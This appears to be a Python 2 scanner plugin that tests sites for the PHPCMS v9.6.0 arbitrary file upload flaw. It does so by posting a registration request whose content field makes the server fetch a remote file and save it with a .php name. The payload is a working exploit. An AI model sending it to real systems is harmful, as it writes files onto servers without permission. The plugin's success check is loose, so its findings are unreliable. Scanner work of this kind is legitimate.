# coding: utf-8
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger
from urllib import urlencode
from engine.engine_utils.rule_result_judge import page_similar


def run_domain(http,ob):
    result = []
    try:
        frame = ob.get('siteType')
        if frame and frame in ['jsp', 'asp', 'aspx']:
            return []

        scheme = ob.get('scheme')
        domain = ob.get('domain')
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        path = ob.get('path', '/')
        if not path or path[-1] != '/':
            path += '/'
        payload = 'index.php?m=member&c=index&a=register&siteid=1'
        new_url = '%s://%s%s%s' % (scheme, domain, path, payload)
        body_data = {
            'siteid': '1',
            'modelid': '1',
            'username': 'eherhq3DG',
            'password': 'aqcx6turhbqh',
            'email': 'eymkeywu@163.com',
            'info[content]': '<img src=https://scan.yundun.com/static/js/yundun_test.txt?.php#.jpg>',
            'dosubmit': '1',
            'protocol': ''
        }
        body_str = urlencode(body_data)
        res, content = http.request(new_url, 'POST', headers=header, body=body_str)
        if res and res.get('status') == '200':
            if page_similar(res.get('status'), content, ob.get('404_page')):
                return []
            if page_similar(res.get('status'), content, ob.get('waf_page')):
                return []
            detail = '检测到PHPCMS v9.6.0 任意文件上传漏洞'
            request = postRequest(new_url, body=body_str, domain=ob['domain'])
            response = getResponse(res, content)
            result.append(getRecord(ob, new_url, ob['level'], detail, request, response))
    except Exception, e:
        logger.error('File: php_cms_v9_6_0_file_upload.py  function: run_domain eror:%s' % str(e))
    return result